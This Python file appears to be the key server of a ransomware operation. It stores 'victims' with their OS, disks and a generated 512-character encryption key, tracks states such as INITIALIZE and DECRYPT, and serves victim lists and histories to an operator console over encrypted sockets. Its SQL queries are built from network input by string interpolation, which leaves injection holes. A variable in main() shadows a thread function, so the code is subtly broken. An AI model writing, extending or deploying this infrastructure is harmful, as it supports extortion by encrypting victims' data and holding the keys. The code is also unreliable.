from threading import Thread
import queue
import string
import random
import utile.network as network
import utile.message
import utile.data as data
import utile.security as security
import utile.config as config
import time

# Load configurations
load = config.load_config('../configuration/config/serveur_cles.cfg', '../configuration/config/serveur_cles.key')
AES_GCM = config.get_config('AES_GCM')
DEBUG_MODE = config.get_config('DEBUG_MODE')
PORT_SERV_CONSOLE = int(config.get_config('PORT_SERV_CONSOLE'))
PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))


def generate_key(length=0, characters=string.ascii_letters + string.digits):
    """
    Generate a random key with given length and characters.
    """
    return ''.join(random.choice(characters) for _ in range(length))


def check_hash(conn, victim_hash):
    """
    Check if the victim's hash signature is already recorded in the DB.

    :param conn: Database connection object
    :param victim_hash: Victim's hash signature
    :return: (list or None) Victim ID and key if found
    """
    query = f'''
    SELECT victims.id_victim, victims.key
    FROM victims
    WHERE victims.hash = "{victim_hash}"
    '''
    victim = data.select_data(conn, query)
    if not victim:
        if DEBUG_MODE:
            print(f"No victim found with hash: {victim_hash[-12:]}")
        return None
    else:
        victim = list(victim[0])  # Convert tuple list to simple list
        if DEBUG_MODE:
            print(f"Victim with hash {victim_hash[-12:]} found in DB with ID {victim[0]}")
        # Fetch the last state of the victim from the DB
        query = f'''
        SELECT states.state, MAX(states.datetime)
        FROM states
        WHERE states.id_victim = {victim[0]}
        '''
        last_state = (data.select_data(conn, query))[0][0]
        victim.append(last_state)
        return victim


def add_victim(db, id, os, disk, key):
    """
    Add a new victim to the database.
    """
    current_date = int(time.time())
    data.insert_data(db, 'victims', '(os, hash, disks, key)', f'("{os}", "{id}", "{disk}", "{key}")')
    victim_id = data.select_data(db, f'SELECT id_victim FROM victims WHERE hash = "{id}"')[0][0]
    data.insert_data(db, 'states', '(id_victim, datetime, state)', f'({victim_id}, {current_date}, "INITIALIZE")')
    return victim_id


def handle_list_victim_request(conn_db, fifo_db, fifo_rep_console):
    """
    Handle the LIST_VICTIM_REQ message type.
    """
    list_victim = data.get_list_victims(conn_db)
    for victim in list_victim:
        msg = utile.message.set_message('list_victim_resp', victim)
        fifo_rep_console.put(msg)
        fifo_rep_console.join()
    msg = utile.message.set_message('list_victim_end')
    fifo_rep_console.put(msg)
    fifo_rep_console.join()
    fifo_db.task_done()


def handle_history_request(conn_db, fifo_db, fifo_rep_console, msg):
    """
    Handle the HISTORY_REQ message type.
    """
    victim_id = msg['HIST_REQ']
    histories = utile.data.get_list_history(conn_db, victim_id)
    for history in histories:
        msg = utile.message.set_message('history_resp', history)
        fifo_rep_console.put(msg)
        fifo_rep_console.join()
    msg = utile.message.set_message('history_end', [victim_id])
    fifo_rep_console.put(msg)
    fifo_rep_console.join()
    fifo_db.task_done()


def handle_change_state(conn_db, fifo_db, msg):
    """
    Handle the CHANGE_STATE message type.
    """
    victim_id = msg['CHGSTATE']
    utile.data.insert_data(conn_db, 'states', '(id_victim, datetime, state)',
                           f"({victim_id}, {int(time.time())}, 'DECRYPT')")
    fifo_db.task_done()
    print("State change handled")


def handle_initialize_request(conn_db, fifo_db, fifo_rep_front, msg):
    """
    Handle the INITIALIZE_REQ message type.
    """
    victim = check_hash(conn_db, msg['INITIALIZE'])
    if victim is None:
        key_victim = generate_key(512)
        victim_id = add_victim(conn_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
        victim = [victim_id, key_victim, 'INITIALIZE']
    msg = utile.message.set_message('initialize_key', victim)
    fifo_rep_front.put(msg)
    fifo_rep_front.join()


def main():
    """
    Main function of the program.
    Initializes the communication with the database, creates queues for requests,
    and starts threads to handle requests from the front-end and console.
    """
    conn_db = data.connect_db()
    fifo_db = queue.Queue()
    fifo_rep_front = queue.Queue()
    fifo_rep_console = queue.Queue()

    thread_front = Thread(target=thread_frontal, args=(fifo_db, fifo_rep_front), daemon=True).start()
    thread_console = Thread(target=thread_console, args=(fifo_db, fifo_rep_console), daemon=True).start()

    while True:
        msg = fifo_db.get()
        msg_type = utile.message.get_message_type(msg)
        if msg_type == 'LIST_VICTIM_REQ':
            handle_list_victim_request(conn_db, fifo_db, fifo_rep_console)
        elif msg_type == 'HISTORY_REQ':
            handle_history_request(conn_db, fifo_db, fifo_rep_console, msg)
        elif msg_type == 'CHANGE_STATE':
            handle_change_state(conn_db, fifo_db, msg)
        elif msg_type == 'INITIALIZE_REQ':
            handle_initialize_request(conn_db, fifo_db, fifo_rep_front, msg)


def thread_console(fifo_db, fifo_rep_console):
    """
    Thread function to handle requests from the console.
    Waits for requests, decrypts them, processes them, and sends responses.
    """
    server_socket = network.start_net_serv(port=PORT_SERV_CONSOLE)
    while True:
        socket_console, _ = server_socket.accept()
        while True:
            aes_key = security.diffie_hellman_send_key(socket_console)
            message = network.receive_message(socket_console)
            message = security.aes_decrypt(message, aes_key)
            msg_type = utile.message.get_message_type(message)
            if msg_type == 'LIST_VICTIM_REQ':
                fifo_db.put(message)
                message = fifo_rep_console.get()
                msg_type = utile.message.get_message_type(message)
                while msg_type != 'LIST_VICTIM_END':
                    message = security.aes_encrypt(message, aes_key)
                    network.send_message(socket_console, message)
                    fifo_rep_console.task_done()
                    message = fifo_rep_console.get()
                    msg_type = utile.message.get_message_type(message)
                message = security.aes_encrypt(message, aes_key)
                network.send_message(socket_console, message)
                fifo_rep_console.task_done()
            elif msg_type == 'HISTORY_REQ':
                fifo_db.put(message)
                msg = fifo_rep_console.get()
                msg_type = utile.message.get_message_type(msg)
                while msg_type != 'HISTORY_END':
                    msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(socket_console, msg)
                    fifo_rep_console.task_done()
                    msg = fifo_rep_console.get()
                    msg_type = utile.message.get_message_type(msg)
                msg = security.aes_encrypt(msg, aes_key)
                network.send_message(socket_console, msg)
                fifo_rep_console.task_done()
            elif msg_type == 'CHANGE_STATE':
                fifo_db.put(message)


def thread_frontal(fifo_db, fifo_rep_front):
    """
    Thread function to handle requests from the front-end.
    Waits for requests, decrypts them, processes them, and sends responses.
    """
    server_socket = network.start_net_serv(port=PORT_SERV_FRONTAL)
    while True:
        socket_front, _ = server_socket.accept()
        aes_key = security.diffie_hellman_send_key(socket_front)
        while True:
            msg = network.receive_message(socket_front)
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = utile.message.get_message_type(msg)
            if msg_type == 'INITIALIZE_REQ':
                fifo_db.put(msg)
                msg = fifo_rep_front.get()
                msg_type = utile.message.get_message_type(msg)
                if msg_type == 'INITIALIZE_KEY':
                    msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(socket_front, msg)
                    fifo_rep_front.task_done()


# Run the main function
if __name__ == "__main__":
    main()
